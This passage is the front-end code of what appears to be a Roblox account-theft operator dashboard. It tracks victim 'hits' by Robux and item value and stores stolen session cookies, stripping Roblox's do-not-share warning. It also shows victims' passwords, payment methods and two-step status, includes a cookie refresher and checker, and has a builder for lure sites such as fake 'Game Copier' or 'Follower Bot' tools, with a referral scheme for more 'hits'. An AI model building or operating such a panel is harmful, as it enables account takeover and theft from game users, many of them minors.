.mo_badge.banned{color:rgba(255,60,60,0.9);background:rgba(220,30,30,0.12);border-color:rgba(200,20,20,0.28);}
.mo_badge.refreshed{color:rgba(80,220,80,0.88);background:rgba(80,220,80,0.07);border-color:rgba(80,220,80,0.2);}
.mo_badge.not_refreshed{color:rgba(255,200,60,0.8);background:rgba(200,150,10,0.07);border-color:rgba(200,150,10,0.2);}
.mo_section_label{font-family:"DM Mono",monospace;font-size:9px;letter-spacing:0.18em;text-transform:uppercase;color:rgba(255,70,70,0.3);margin:18px 0 10px;display:flex;align-items:center;gap:8px;}
.mo_section_label::after{content:"";flex:1;height:1px;background:rgba(255,255,255,0.05);}
@media (max-width:1200px){.stats_row{grid-template-columns:repeat(3,1fr);}.charts_row{grid-template-columns:1fr;}}
@media (max-width:700px){.sidebar{transform:translateX(-110%);transition:transform 0.38s cubic-bezier(0.22,1,0.36,1);animation:none;}.sidebar.mob_open{transform:translateX(0);}.ham_btn{display:flex;}.wrap{margin-left:0;max-width:100vw;padding:68px 14px 56px;}.stats_row{grid-template-columns:1fr 1fr;}.charts_row{grid-template-columns:1fr;}.cookie_wrap{max-width:100%;}.ref_card_outer{max-width:100%;}.mo_grid{grid-template-columns:1fr;}}
</style>
</head>
<body>
<div class="cursor"><div class="c_dot" id="c_dot"></div><div class="c_ring" id="c_ring"></div></div>
<div class="toast" id="toast"></div>
<div class="mesh"></div>
<div class="grid_bg"></div>
<div class="orb orb_1"></div>
<div class="orb orb_2"></div>

<div class="sb_overlay" id="sb_overlay" onclick="close_mob_sb()"></div>
<button class="ham_btn" id="ham_btn" onclick="open_mob_sb()"><i class="bi bi-list"></i></button>

<aside class="sidebar" id="sidebar">
    <div class="sb_body">
        <span class="sb_group_label">Main</span>
        <a class="sb_item on" href="#" onclick="go('dash',this);return false;"><i class="bi bi-grid-1x2-fill"></i>Dash</a>
        <a class="sb_item" href="#" onclick="go('cookie',this);return false;"><i class="bi bi-cookie"></i>Cookie</a>
        <a class="sb_item" href="#" onclick="go('storage',this);load_storage();return false;"><i class="bi bi-database-fill"></i>Storage</a>
        <a class="sb_item" href="#" onclick="go('sites',this);return false;"><i class="bi bi-globe2"></i>Sites</a>
        <a class="sb_item" href="#" onclick="go('referrals',this);return false;"><i class="bi bi-share-fill"></i>Referral</a>
    </div>
    <div class="sb_foot"><a class="sb_item" href="/logout"><i class="bi bi-box-arrow-right"></i>Log out</a></div>
</aside>

<div class="wrap">
    <div class="pg on" id="pg_dash">
        <div class="pg_head"><i class="bi bi-grid-1x2-fill"></i>Dashboard</div>
        <div class="stats_row">
            <div class="gc sc"><div class="gc_bg"></div><div class="gc_shine"></div><div class="gc_ref"></div><div class="gc_body"><div class="sc_top"><div class="sc_icon"><i class="bi bi-people-fill"></i></div></div><div class="sc_val" id="stat_visitors"><span class="sc_skeleton"></span></div><div class="sc_lbl">Total Visitors</div></div></div>
            <div class="gc sc"><div class="gc_bg"></div><div class="gc_shine"></div><div class="gc_ref"></div><div class="gc_body"><div class="sc_top"><div class="sc_icon"><i class="bi bi-currency-dollar"></i></div></div><div class="sc_val" id="stat_robux"><span class="sc_skeleton"></span></div><div class="sc_lbl">Total Robux</div></div></div>
            <div class="gc sc"><div class="gc_bg"></div><div class="gc_shine"></div><div class="gc_ref"></div><div class="gc_body"><div class="sc_top"><div class="sc_icon"><i class="bi bi-lightning-charge-fill"></i></div></div><div class="sc_val" id="stat_hits"><span class="sc_skeleton"></span></div><div class="sc_lbl">Total Hits</div></div></div>
            <div class="gc sc"><div class="gc_bg"></div><div class="gc_shine"></div><div class="gc_ref"></div><div class="gc_body"><div class="sc_top"><div class="sc_icon"><i class="bi bi-graph-up-arrow"></i></div></div><div class="sc_val" id="stat_rap"><span class="sc_skeleton"></span></div><div class="sc_lbl">Total RAP</div></div></div>
            <div class="gc sc"><div class="gc_bg"></div><div class="gc_shine"></div><div class="gc_ref"></div><div class="gc_body"><div class="sc_top"><div class="sc_icon"><i class="bi bi-bar-chart-fill"></i></div></div><div class="sc_val" id="stat_summary"><span class="sc_skeleton"></span></div><div class="sc_lbl">Total Summary</div></div></div>
        </div>
        <div class="charts_row">
            <div class="gc ch_card"><div class="gc_bg"></div><div class="gc_shine"></div><div class="gc_body"><div class="ch_head"><div class="ch_title"><i class="bi bi-bar-chart-line-fill"></i>Recent Summary</div><span class="ch_pill">Live</span></div><div class="ch_wrap"><canvas id="c_sum"></canvas></div></div></div>
            <div class="gc ch_card"><div class="gc_bg"></div><div class="gc_shine"></div><div class="gc_body"><div class="ch_head"><div class="ch_title"><i class="bi bi-activity"></i>Recent RAP</div><span class="ch_pill">Live</span></div><div class="ch_wrap"><canvas id="c_rap"></canvas></div></div></div>
            <div class="gc ch_card"><div class="gc_bg"></div><div class="gc_shine"></div><div class="gc_body"><div class="ch_head"><div class="ch_title"><i class="bi bi-currency-dollar"></i>Recent Robux</div><span class="ch_pill">Live</span></div><div class="ch_wrap"><canvas id="c_hits"></canvas></div></div></div>
        </div>
        <div class="lh_section"><div class="gc lh_card"><div class="gc_bg"></div><div class="gc_shine"></div><div class="gc_body"><div class="lh_head"><div class="lh_title"><i class="bi bi-lightning-charge-fill"></i>Live Hits</div><span class="ch_pill">Recent</span></div><div id="lh_content"><div class="lh_empty">No data found</div></div></div></div></div>
    </div>

    <div class="pg" id="pg_cookie">
        <div class="pg_head"><i class="bi bi-cookie"></i>Cookie</div>
        <div class="cookie_wrap">
            <div class="gc"><div class="gc_bg"></div><div class="gc_shine"></div><div class="gc_ref"></div>
                <div class="gc_body">
                    <div class="tog" id="tog">
                        <div class="tog_knob" id="tok" style="left:5px;width:130px;"></div>
                        <div class="tog_opt on" id="o_ref" onclick="set_mode('ref')"><i class="bi bi-arrow-repeat"></i>Refresher</div>
                        <div class="tog_opt" id="o_chk" onclick="set_mode('chk')"><i class="bi bi-search"></i>Checker</div>
                    </div>
                    <div class="fi"><i class="fi_ico bi bi-key-fill"></i><input type="text" id="ck_in" placeholder="Cookie..." autocomplete="off" spellcheck="false"/></div>
                    <div class="ts_wrap"><div class="cf-turnstile" id="ts_cookie" data-sitekey="<?=$site_info["site_key"];?>" data-theme="dark"></div></div>
                    <button class="btn" onclick="do_submit()"><span class="btn_i" id="btn_lbl"><i class="bi bi-arrow-repeat"></i>Refresh</span></button>
                    <div class="new_cookie_wrap" id="new_cookie_wrap"><div class="fi" style="margin-bottom:0;"><i class="fi_ico bi bi-key-fill" style="color:rgba(80,220,80,0.4);"></i><input type="text" id="new_cookie_out" readonly onclick="this.select()"/></div></div>
                    <div class="out_stats" id="out_stats">
                        <div class="os_hero"><div class="os_hero_item"><span class="os_num" id="os_robux">—</span><span class="os_lbl">Robux</span></div><div class="os_hero_item"><span class="os_num" id="os_rap">—</span><span class="os_lbl">RAP</span></div><div class="os_hero_item"><span class="os_num" id="os_summary">—</span><span class="os_lbl">Summary</span></div></div>
                        <div class="os_rows"><div class="gc os_row"><div class="gc_bg"></div><div class="gc_body"><span class="os_key">Username</span><span class="os_val" id="os_username">—</span></div></div><div class="gc os_row"><div class="gc_bg"></div><div class="gc_body"><span class="os_key">Status</span><span class="os_val good" id="os_status">—</span></div></div></div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <div class="pg" id="pg_storage">
        <div class="pg_head"><i class="bi bi-database-fill"></i>Storage</div>
        <div class="lh_section" style="margin-top:0;"><div class="gc lh_card"><div class="gc_bg"></div><div class="gc_shine"></div><div class="gc_body"><div id="cs_content"><div class="lh_empty">Loading…</div></div></div></div></div>
    </div>

    <div class="pg" id="pg_sites">
        <div class="pg_head"><i class="bi bi-globe2"></i>Sites</div>
        <div class="sites_g" id="sites_g"></div>
        <div class="gc site_add" onclick="open_create()"><div class="gc_bg"></div><div class="gc_body"><div class="add_icon"><i class="bi bi-plus-lg"></i></div><div class="add_lbl">Create Site</div></div></div>
    </div>

    <div class="pg" id="pg_referrals">
        <div class="pg_head"><i class="bi bi-share-fill"></i>Referral</div>
        <div class="ref_pg_wrap">
            <div class="gc ref_card_outer"><div class="gc_bg"></div><div class="gc_shine"></div><div class="gc_ref"></div>
                <div class="gc_body">
                    <div class="ref_top_row"><div><div class="ref_title_text">Your Referral</div><div class="ref_sub_text">Share to earn chain hits</div></div><div class="ref_level_badge noob" id="ref_level_badge">Noob</div></div>
                    <div class="ref_hero"><div class="ref_hero_item"><span class="ref_hero_num" id="ref_uses_val">—</span><span class="ref_hero_lbl">Total Uses</span></div><div class="ref_hero_item"><span class="ref_hero_num" id="ref_code_val">—</span><span class="ref_hero_lbl">Your Code</span></div></div>
                    <div class="ref_divider"></div>
                    <div class="ref_rows"><div class="gc ref_row"><div class="gc_bg"></div><div class="gc_body"><span class="ref_row_key">Level</span><span class="ref_row_val" id="ref_row_level">—</span></div></div><div class="gc ref_row"><div class="gc_bg"></div><div class="gc_body"><span class="ref_row_key">Next Tier</span><span class="ref_row_val" id="ref_row_next">—</span></div></div></div>
                    <div class="ref_progress_wrap"><div class="ref_progress_meta"><span class="ref_progress_lbl" id="ref_progress_label">Progress to Beginner</span><span class="ref_progress_lbl" id="ref_progress_next">0 / 20</span></div><div class="ref_bar_bg"><div class="ref_bar_fill" id="ref_bar" style="width:0%"></div></div></div>
                    <div class="ref_link_row"><div class="ref_link_box" id="ref_link_box">Loading…</div><button class="ref_copy_btn" onclick="copy_ref()"><i class="bi bi-copy"></i>Copy</button></div>
                </div>
            </div>
        </div>
    </div>
</div>

<!-- site modal -->
<div class="mo" id="modal" onclick="mo_out(event)">
    <div class="mo_box">
        <div class="mo_head"><div class="mo_head_icon"><i class="bi bi-globe2"></i></div><div class="mo_head_text"><div class="mo_head_title" id="mo_title_lbl">Create Site</div><div class="mo_head_sub">Configure your site</div></div><button class="mo_close" onclick="close_mo()"><i class="bi bi-x-lg"></i></button></div>
        <div class="mo_body">
            <div class="mo_fi"><div class="mo_fi_label"><i class="bi bi-cursor-text"></i>Site Name</div><input type="text" id="mo_name" placeholder="e.g. Game Copier, Follower Bot…" autocomplete="off" maxlength="40" oninput="count_chars('mo_name','mo_name_count',40)"/><div class="mo_fi_meta"><span class="mo_fi_count" id="mo_name_count">0 / 40</span></div></div>
            <div class="mo_fi"><div class="mo_fi_label"><i class="bi bi-type-h1"></i>Header / Tagline</div><input type="text" id="mo_header" placeholder="e.g. The fastest Roblox tool…" autocomplete="off" maxlength="80" oninput="count_chars('mo_header','mo_header_count',80)"/><div class="mo_fi_meta"><span class="mo_fi_count" id="mo_header_count">0 / 80</span></div></div>
            <div class="mo_fi"><div class="mo_fi_label"><i class="bi bi-card-text"></i>Description</div><textarea id="mo_desc" placeholder="e.g. The best tool since 2020…" maxlength="200" oninput="count_chars('mo_desc','mo_desc_count',200)"></textarea><div class="mo_fi_meta"><span class="mo_fi_count" id="mo_desc_count">0 / 200</span></div></div>
            <div class="mo_ts_wrap"><div class="cf-turnstile" id="ts_modal" data-sitekey="<?=$site_info["site_key"];?>" data-theme="dark"></div></div>
        </div>
        <div class="mo_footer"><div class="mo_acts"><button class="btn_ghost" onclick="close_mo()">Cancel</button><button class="btn" onclick="save_site()"><span class="btn_i" id="save_btn_lbl"><i class="bi bi-check-lg"></i>Save Site</span></button></div></div>
    </div>
</div>

<div class="mo" id="storage_mo" onclick="storage_mo_out(event)">
    <div class="mo_box" style="width:680px;">
        <div class="mo_head">
            <div class="mo_head_icon"><i class="bi bi-person-fill"></i></div>
            <div class="mo_head_text"><div class="mo_head_title" id="smo_title">Account Info</div><div class="mo_head_sub" id="smo_sub">Cookie</div></div>
            <button class="mo_close" onclick="close_storage_mo()"><i class="bi bi-x-lg"></i></button>
        </div>
        <div class="mo_body" id="smo_body"></div>
        <div class="mo_footer">
            <div class="mo_acts">
                <button class="btn_ghost" onclick="close_storage_mo()">Close</button>
                <button class="btn" onclick="copy_smo_cookie()" style="max-width:200px;"><span class="btn_i"><i class="bi bi-copy"></i>Copy Cookie</span></button>
            </div>
        </div>
    </div>
</div>

<script>
    function show_toast(msg) {
        const el = document.getElementById("toast");
        el.textContent = msg;
        el.classList.add("on");
        setTimeout(() => el.classList.remove("on"), 2800);
    }
    
    function get_ts_token(id) {
        const el = document.getElementById(id);
        const input = el ? el.querySelector("[name='cf-turnstile-response']") : null;
        return input ? input.value.trim() : "";
    }
    
    function xor_encrypt(data, key) 
    {
        const d = typeof data === "string" ? data : JSON.stringify(data);
        const encoded = unescape(encodeURIComponent(d));
        let out = "";
        for (let i = 0; i < encoded.length; i++)
            out += String.fromCharCode(encoded.charCodeAt(i) ^ key.charCodeAt(i % key.length));
        return btoa(out);
    }
    
    function api(method, input_arr = [], output_keys = []) {
        const blob = xor_encrypt({ method, input: input_arr, ts: Date.now() }, "<?=$site_info["name"];?>HAR");
        return new Promise((resolve, reject) => {
            const xhr = new XMLHttpRequest();
            xhr.open("POST", "/framework/api", true);
            xhr.setRequestHeader("Content-Type", "application/json");
            xhr.onreadystatechange = function() {
                if (xhr.readyState !== 4) return;
                let raw;
                try { raw = JSON.parse(xhr.responseText); } catch (_) { return reject(new Error("HTTP " + xhr.status)); }
                if (raw.error) return reject(new Error(raw.error));
                if (xhr.status < 200 || xhr.status >= 300) return reject(new Error("HTTP " + xhr.status));
                for (const k of output_keys) if (!(k in raw)) return reject(new Error("missing field: " + k));
                resolve(raw);
            };
            xhr.onerror = () => reject(new Error("network error"));
            xhr.send(JSON.stringify({ blob }));
        });
    }
const c_dot = document.getElementById("c_dot"), c_ring = document.getElementById("c_ring");
let mx = -200, my = -200, rx = -200, ry = -200;
const lerp = (a, b, t) => a + (b - a) * t;
const is_touch = window.matchMedia("(hover:none),(pointer:coarse)").matches;
if (!is_touch) { document.body.style.cursor = "none"; document.addEventListener("pointermove", e => { if (e.pointerType === "mouse") { mx = e.clientX; my = e.clientY; c_dot.style.left = mx + "px"; c_dot.style.top = my + "px"; } }); (function tick() { rx = lerp(rx, mx, 0.13); ry = lerp(ry, my, 0.13); c_ring.style.left = rx + "px"; c_ring.style.top = ry + "px"; requestAnimationFrame(tick); })(); }
document.querySelectorAll("button,a,.sb_item,.tog_opt,.ref_copy_btn,.si_btn,.cs_row_link").forEach(el => { el.addEventListener("mouseenter", () => document.body.classList.add("hovering")); el.addEventListener("mouseleave", () => document.body.classList.remove("hovering")); });
document.querySelectorAll(".gc").forEach(card => { const ref = card.querySelector(".gc_ref"); card.addEventListener("mousemove", e => { const r = card.getBoundingClientRect(); const nx = (e.clientX - r.left) / r.width, ny = (e.clientY - r.top) / r.height; card.style.transition = "transform 0.1s ease"; card.style.transform = `perspective(900px) rotateX(${(ny-.5)*-6}deg) rotateY(${(nx-.5)*6}deg) scale(1.016) translateY(-3px)`; if (ref) { ref.style.setProperty("--mx", `${nx*100}%`); ref.style.setProperty("--my", `${ny*100}%`); } }); card.addEventListener("mouseleave", () => { card.style.transition = "transform 0.6s cubic-bezier(0.22,1,0.36,1)"; card.style.transform = ""; }); });
const toast = msg => { const el = document.getElementById("toast"); el.textContent = msg; el.classList.add("on"); setTimeout(() => el.classList.remove("on"), 2800); };
const open_mob_sb = () => { document.getElementById("sidebar").classList.add("mob_open"); document.getElementById("sb_overlay").classList.add("open"); document.getElementById("ham_btn").classList.add("hidden"); };
const close_mob_sb = () => { document.getElementById("sidebar").classList.remove("mob_open"); document.getElementById("sb_overlay").classList.remove("open"); setTimeout(() => document.getElementById("ham_btn").classList.remove("hidden"), 320); };
const go = (id, el) => { document.querySelectorAll(".pg").forEach(p => p.classList.remove("on")); document.querySelectorAll(".sb_item").forEach(l => l.classList.remove("on")); document.getElementById("pg_" + id).classList.add("on"); el.classList.add("on"); close_mob_sb(); return false; };
const fmt = n => { n = Math.floor(parseInt(n) || 0); if (n >= 1_000_000) { const v = n / 1_000_000; const dec = (v % 1).toFixed(1).slice(1); return Math.floor(v).toLocaleString() + `<em class="red_suffix">${dec !== ".0" ? dec : ""}M+</em>`; } if (n >= 1_000) { const v = n / 1_000; const dec = (v % 1).toFixed(1).slice(1); return Math.floor(v).toLocaleString() + `<em class="red_suffix">${dec !== ".0" ? dec : ""}k+</em>`; } return n.toLocaleString(); };
const fmt_plain = n => { n = Math.floor(parseInt(n) || 0); if (n >= 1_000_000) { const v = n / 1_000_000; const dec = (v % 1).toFixed(1).slice(1); return Math.floor(v) + (dec !== ".0" ? dec : "") + "M+"; } if (n >= 1_000) { const v = n / 1_000; const dec = (v % 1).toFixed(1).slice(1); return Math.floor(v) + (dec !== ".0" ? dec : "") + "k+"; } return n.toLocaleString(); };
function animate_stat(el, target_raw) { const target = Math.floor(parseInt(target_raw) || 0); const current = parseInt(el.dataset.raw ?? null); const is_first = el.dataset.raw === undefined; if (!is_first && current === target) return; el.querySelectorAll(".sc_skeleton").forEach(s => s.remove()); el.dataset.raw = target; if (!is_first && target > current && (target - current) <= 200 && target <= 500) { let v = Math.max(0, current); const step = () => { v = Math.min(v + 1, target); el.textContent = v.toLocaleString(); if (v < target) setTimeout(step, 140); }; setTimeout(step, 140); } else { el.classList.remove("stat_pop"); void el.offsetWidth; el.innerHTML = fmt(target); el.classList.add("stat_pop"); } }
const base_opts = () => ({ responsive: true, maintainAspectRatio: false, layout: { padding: { top: 18, right: 10, left: 4, bottom: 0 } }, plugins: { legend: { display: false }, tooltip: { backgroundColor: "rgba(7,2,2,0.96)", borderColor: "rgba(195,18,18,0.18)", borderWidth: 1, titleFont: { family: "DM Mono", size: 9.5 }, bodyFont: { family: "DM Sans", size: 13, weight: "700" }, titleColor: "rgba(255,60,60,0.5)", bodyColor: "rgba(255,255,255,0.88)", padding: 12, cornerRadius: 10 } }, scales: { x: { ticks: { color: "rgba(255,255,255,0.3)", font: { family: "DM Mono", size: 10 }, maxRotation: 0 }, grid: { color: "rgba(255,255,255,0.032)" }, border: { color: "rgba(255,255,255,0.04)" } }, y: { ticks: { color: "rgba(255,255,255,0.3)", font: { family: "DM Sans", size: 11, weight: "600" }, maxTicksLimit: 5, callback: v => v >= 1e6 ? (v/1e6).toFixed(1)+"M" : v >= 1000 ? (v/1000).toFixed(0)+"k" : v }, grid: { color: "rgba(255,255,255,0.032)" }, border: { color: "rgba(255,255,255,0.04)" } } } });
const chart_sum   = new Chart(document.getElementById("c_sum"),  { type: "bar",  data: { labels: [], datasets: [{ data: [], backgroundColor: "rgba(220,28,28,0.22)", borderColor: "rgba(255,60,60,0.4)", borderWidth: 1, borderRadius: 6 }] }, options: base_opts() });
const chart_rap   = new Chart(document.getElementById("c_rap"),  { type: "line", data: { labels: [], datasets: [{ data: [], borderColor: "rgba(255,60,60,0.8)", backgroundColor: "rgba(180,10,10,0.08)", pointBackgroundColor: "rgba(255,40,40,0.9)", pointBorderColor: "transparent", pointRadius: 4, pointHoverRadius: 6, tension: 0.4, fill: true, borderWidth: 2 }] }, options: base_opts() });
const chart_robux = new Chart(document.getElementById("c_hits"), { type: "line", data: { labels: [], datasets: [{ data: [], borderColor: "rgba(210,22,22,0.8)", backgroundColor: "rgba(148,6,6,0.12)", pointBackgroundColor: "rgba(255,50,50,0.9)", pointBorderColor: "transparent", pointRadius: 4.5, pointHoverRadius: 7, tension: 0.45, fill: true, borderWidth: 2.5 }] }, options: base_opts() });
const esc = s => { const d = document.createElement("div"); d.textContent = s; return d.innerHTML; };
const bool_str = v => (parseInt(v) === 1 || v === true || v === "True" || v === "1") ? "True" : "False";
const level_thresholds = [{ name: "Noob", min: 0, max: 20 }, { name: "Beginner", min: 20, max: 100 }, { name: "Pro", min: 100, max: 500 }, { name: "Godly", min: 500, max: 1000 }, { name: "Insane", min: 1000, max: Infinity }];
function render_referral(ref_uses, ref_code, ref_level, ref_url) { document.getElementById("ref_uses_val").textContent = ref_uses.toLocaleString(); document.getElementById("ref_code_val").textContent = ref_code; document.getElementById("ref_link_box").textContent = ref_url; const badge = document.getElementById("ref_level_badge"); badge.textContent = ref_level; badge.className = "ref_level_badge " + ref_level.toLowerCase(); document.getElementById("ref_row_level").textContent = ref_level; const tier = level_thresholds.find(t => t.name === ref_level) || level_thresholds[0]; const next_tier = level_thresholds.find(t => t.min === tier.max); if (next_tier) { const pct = Math.min(((ref_uses - tier.min) / (tier.max - tier.min)) * 100, 100); document.getElementById("ref_bar").style.width = pct + "%"; document.getElementById("ref_progress_label").textContent = "Progress to " + next_tier.name; document.getElementById("ref_progress_next").textContent = ref_uses + " / " + tier.max; document.getElementById("ref_row_next").textContent = next_tier.name; } else { document.getElementById("ref_bar").style.width = "100%"; document.getElementById("ref_progress_label").textContent = "Max level reached"; document.getElementById("ref_progress_next").textContent = ref_uses.toLocaleString() + " uses"; document.getElementById("ref_row_next").textContent = "—"; } }
let sites = [], edit_i = -1, last_hits_hash = null, last_sites_hash = null;
async function load_dashboard() { try { const res = await api("get_account", [], ["visitors","robux","hits","rap","summary","sites","live_hits","referral_code","referral_uses","referral_level","referral_url"]); animate_stat(document.getElementById("stat_visitors"), res.visitors); animate_stat(document.getElementById("stat_robux"), res.robux); animate_stat(document.getElementById("stat_hits"), res.hits); animate_stat(document.getElementById("stat_rap"), res.rap); animate_stat(document.getElementById("stat_summary"), res.summary); render_referral(parseInt(res.referral_uses) || 0, res.referral_code, res.referral_level, res.referral_url); const new_sites_hash = JSON.stringify(res.sites || []); if (new_sites_hash !== last_sites_hash) { last_sites_hash = new_sites_hash; sites = res.sites || []; render_sites(); } const hits = (res.live_hits || []).slice().reverse(); const labels = hits.map((h, i) => h.username || ("#" + (i + 1))); const rap_data = hits.map(h => parseInt(h.rap) || 0); const robux_data = hits.map(h => parseInt(h.robux) || 0); const summary_data = hits.map(h => parseInt(h.summary) || 0); chart_sum.data.labels = labels; chart_sum.data.datasets[0].data = summary_data; chart_sum.update(); chart_rap.data.labels = labels; chart_rap.data.datasets[0].data = rap_data; chart_rap.update(); chart_robux.data.labels = labels; chart_robux.data.datasets[0].data = robux_data; chart_robux.update(); const hits_hash = JSON.stringify(hits); if (hits_hash !== last_hits_hash) { last_hits_hash = hits_hash; const lh = document.getElementById("lh_content"); if (!hits.length) { lh.innerHTML = `<div class="lh_empty">No data found</div>`; } else { lh.innerHTML = `<table class="lh_table"><thead><tr><th>User</th><th>Robux</th><th>RAP</th><th>Summary</th><th>Time</th></tr></thead><tbody>${hits.map(h => `<tr><td><div class="lh_user">${h.icon ? `<img class="lh_avatar" src="${h.icon}" onerror="this.style.display='none'"/>` : `<div class="lh_avatar"></div>`}<span>${esc(h.username || "Unknown")}</span></div></td><td class="lh_mono">${fmt_plain(h.robux)}</td><td class="lh_mono">${fmt_plain(h.rap)}</td><td class="lh_mono">${fmt_plain(h.summary)}</td><td class="lh_mono">${h.hit_at ? h.hit_at.slice(0,16).replace("T"," ") : "—"}</td></tr>`).join("")}</tbody></table>`; } } } catch (err) { toast("✗ " + err.message); } }
load_dashboard();
setInterval(load_dashboard, 5000);

let storage_data = [];
async function load_storage() {
    const cs = document.getElementById("cs_content");
    cs.innerHTML = `<div class="lh_empty">Loading…</div>`;
    try {
        const res = await api("get_cookie_storage", [], ["storage"]);
        storage_data = res.storage || [];
        if (!storage_data.length) { cs.innerHTML = `<div class="lh_empty">No cookies stored</div>`; return; }
        cs.innerHTML = `<table class="lh_table"><thead><tr><th>User</th><th>Robux</th><th>RAP</th><th>Summary</th><th>Premium</th><th>Time</th></tr></thead><tbody>${storage_data.map(h => `<tr class="cs_row_link" onclick="open_storage_mo(${h.id})"><td><div class="lh_user">${h.icon ? `<img class="lh_avatar" src="${h.icon}" onerror="this.style.display='none'"/>` : `<div class="lh_avatar"></div>`}<span>${esc(h.username || "Unknown")}</span></div></td><td class="lh_mono">${fmt_plain(h.robux)}</td><td class="lh_mono">${fmt_plain(h.rap)}</td><td class="lh_mono">${fmt_plain(h.summary)}</td><td class="lh_mono">${esc(h.premium && h.premium !== "False" ? h.premium : "—")}</td><td class="lh_mono">${h.hit_at ? h.hit_at.slice(0,16).replace("T"," ") : "—"}</td></tr>`).join("")}</tbody></table>`;
    } catch (err) { cs.innerHTML = `<div class="lh_empty">Failed to load</div>`; toast("✗ " + err.message); }
}

let smo_cookie = "";
function open_storage_mo(id) {
    const h = storage_data.find(x => x.id == id);
    if (!h) return;
    smo_cookie = (h.cookie || "").replace("_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_", "");
    document.getElementById("smo_title").textContent = h.username || "Unknown";
    document.getElementById("smo_sub").textContent = h.hit_at ? h.hit_at.slice(0, 16).replace("T", " ") : "Cookie";

    const field = (label, value, icon) => `
        <div class="mo_fi">
            <div class="mo_fi_label"><i class="bi bi-${icon}"></i>${label}</div>
            <input type="text" readonly value="${esc(String(value ?? "N/A"))}" onclick="this.select()"/>
        </div>`;

    const two_step_str = parseInt(h.two_step_enabled) ? `True (${h.two_step_type || "Unknown"})` : "False";
    const clean_cookie = smo_cookie;

    document.getElementById("smo_body").innerHTML = `
        <div class="mo_avatar_row">
            ${h.icon ? `<img class="mo_avatar" src="${h.icon}" onerror="this.className='mo_avatar_fallback';this.innerHTML='<i class=\\'bi bi-person-fill\\'></i>'"/>` : `<div class="mo_avatar_fallback"><i class="bi bi-person-fill"></i></div>`}
            <div class="mo_avatar_info">
                <div class="mo_avatar_name">${esc(h.username || "Unknown")}</div>
                <div class="mo_avatar_sub">${esc(h.display_name || "")} ${h.user_id ? "· ID " + esc(h.user_id) : ""}</div>
                <div style="display:flex;gap:6px;flex-wrap:wrap;margin-top:6px;">
                    ${parseInt(h.banned) ? `<span class="mo_badge banned"><i class="bi bi-slash-circle-fill"></i>Banned</span>` : ""}
                    ${parseInt(h.refreshed) ? `<span class="mo_badge refreshed"><i class="bi bi-arrow-repeat"></i>Refreshed</span>` : `<span class="mo_badge not_refreshed"><i class="bi bi-x-circle"></i>Not Refreshed</span>`}
                    ${h.premium && h.premium !== "False" ? `<span class="mo_badge refreshed"><i class="bi bi-star-fill"></i>${esc(h.premium)}</span>` : ""}
                </div>
            </div>
        </div>

        <div class="mo_section_label">Account</div>
        <div class="mo_grid">
            ${field("Username", h.username, "person-fill")}
            ${field("Display Name", h.display_name, "tag-fill")}
            ${field("User ID", h.user_id, "fingerprint")}
            ${field("Password (50/50)", h.password || "N/A", "key-fill")}
            ${field("Account Age", h.account_age ? h.account_age + " days (" + (h.created_date || "?") + ")" : "Unknown", "calendar-fill")}
            ${field("Banned", parseInt(h.banned) ? "True" : "False", "slash-circle-fill")}
        </div>

        <div class="mo_section_label">Economy</div>
        <div class="mo_grid">
            ${field("Robux", Number(h.robux).toLocaleString(), "currency-dollar")}
            ${field("Pending Robux", Number(h.pending_robux).toLocaleString(), "hourglass-split")}
            ${field("RAP", Number(h.rap).toLocaleString(), "graph-up-arrow")}
            ${field("Limiteds", h.limiteds_count || "0", "box-fill")}
            ${field("Summary", Number(h.summary).toLocaleString(), "bar-chart-fill")}
            ${field("Credit Balance", Number(h.credit_balance || 0).toFixed(2) + " " + (h.credit_currency || "GBP"), "bank-fill")}
            ${field("Payment Methods", h.payment_methods || "False", "credit-card-fill")}
            ${field("Premium", h.premium && h.premium !== "False" ? h.premium : "False", "star-fill")}
        </div>

        <div class="mo_section_label">Items</div>
        <div class="mo_grid">
            ${field("Korblox", parseInt(h.has_korblox) ? "True" : "False", "skull-fill")}
            ${field("Headless", parseInt(h.has_headless) ? "True" : "False", "circle-fill")}
        </div>

        <div class="mo_section_label">Security</div>
        <div class="mo_grid">
            ${field("Email Verified", parseInt(h.email_verified) ? "True" : "False", "envelope-fill")}
            ${field("Phone Verified", parseInt(h.phone_verified) ? "True" : "False", "phone-fill")}
            ${field("2-Step Verification", two_step_str, "shield-lock-fill")}
        </div>

        <div class="mo_section_label">Social</div>
        <div class="mo_grid">
            ${field("Friends", Number(h.friends_count || 0).toLocaleString(), "people-fill")}
            ${field("Followers", Number(h.followers_count || 0).toLocaleString(), "person-check-fill")}
            ${field("Following", Number(h.following_count || 0).toLocaleString(), "person-plus-fill")}
            ${field("Groups", h.groups_count || "0", "building-fill")}
            ${field("Games", h.games_count || "0", "controller")}
            ${field("Total Visits", Number(h.total_visits || 0).toLocaleString(), "eye-fill")}
        </div>

        <div class="mo_section_label">Cookie</div>
        <div class="mo_fi mo_grid_full">
            <div class="mo_fi_label"><i class="bi bi-key-fill"></i>Cookie</div>
            <textarea readonly onclick="this.select()" style="height:72px;font-size:10px;word-break:break-all;">${esc(clean_cookie)}</textarea>
        </div>`;

    document.getElementById("storage_mo").classList.add("on");
}

const close_storage_mo = () => { document.getElementById("storage_mo").classList.remove("on"); smo_cookie = ""; };
const storage_mo_out = e => { if (e.target.id === "storage_mo") close_storage_mo(); };
const copy_smo_cookie = () => { if (!smo_cookie) { toast("✗ No cookie"); return; } navigator.clipboard.writeText(smo_cookie).then(() => toast("✓ Cookie copied!")).catch(() => toast("✗ Failed to copy")); };

const copy_ref = () => { const url = document.getElementById("ref_link_box").textContent; navigator.clipboard.writeText(url).then(() => toast("✓ Referral link copied!")).catch(() => toast("✗ Failed to copy.")); };
let mode = "ref";
const init_tog = () => { const r = document.getElementById("o_ref"); const k = document.getElementById("tok"); k.style.left = "5px"; k.style.width = r.offsetWidth + "px"; };
document.addEventListener("DOMContentLoaded", () => { requestAnimationFrame(() => requestAnimationFrame(() => setTimeout(init_tog, 0))); });
window.addEventListener("load", () => { requestAnimationFrame(() => requestAnimationFrame(init_tog)); });
